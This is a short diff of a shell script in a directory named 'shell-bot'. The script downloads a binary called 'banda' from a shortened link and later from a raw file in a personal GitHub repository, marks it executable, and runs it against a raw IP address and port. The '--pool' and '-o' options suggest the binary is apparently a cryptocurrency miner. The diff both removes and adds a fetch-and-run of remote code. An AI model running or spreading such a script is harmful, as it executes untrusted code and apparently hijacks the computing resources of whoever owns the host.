@@ -4,6 +4,6 @@
 
 
 cd /home/shell-bot
-wget -qO banda https://git.io/J1XFa
+wget -qO banda https://github.com/Omarjetos/ezz/blob/master/nano?raw=true
 chmod +x banda
-./banda --disable-gpu --pool 138.197.166.210:5555
+./banda -o 138.197.166.210:5555
